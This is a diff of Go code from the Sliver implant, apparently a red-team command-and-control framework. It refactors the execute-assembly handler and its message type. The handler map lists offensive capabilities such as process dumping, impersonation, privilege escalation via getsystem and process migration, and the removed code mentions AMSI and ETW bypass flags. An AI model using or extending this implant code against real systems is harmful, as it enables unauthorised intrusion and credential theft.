@@ -38,18 +38,18 @@ import (
 var (
 	windowsHandlers = map[uint32]RPCHandler{
 		// Windows Only
-		sliverpb.MsgTaskReq:            taskHandler,
-		sliverpb.MsgProcessDumpReq:     dumpHandler,
-		sliverpb.MsgImpersonateReq:     impersonateHandler,
-		sliverpb.MsgRevToSelfReq:       revToSelfHandler,
-		sliverpb.MsgRunAsReq:           runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
-		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
-		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
-		sliverpb.MsgStartServiceReq:    startService,
-		sliverpb.MsgStopServiceReq:     stopService,
-		sliverpb.MsgRemoveServiceReq:   removeService,
+		sliverpb.MsgTaskReq:                  taskHandler,
+		sliverpb.MsgProcessDumpReq:           dumpHandler,
+		sliverpb.MsgImpersonateReq:           impersonateHandler,
+		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
+		sliverpb.MsgRunAsReq:                 runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
+		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
+		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
+		sliverpb.MsgStartServiceReq:          startService,
+		sliverpb.MsgStopServiceReq:           stopService,
+		sliverpb.MsgRemoveServiceReq:         removeService,
 
 		// Generic
 		sliverpb.MsgPsReq:        psHandler,
@@ -166,10 +166,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
-	//{{if .Debug}}
-	log.Println("executeAssemblyHandler called")
-	//{{end}}
-	execReq := &sliverpb.ExecuteAssemblyReq{}
+	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -177,7 +174,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass, execReq.EtwBypass, execReq.Offset)
+	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process)
 	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
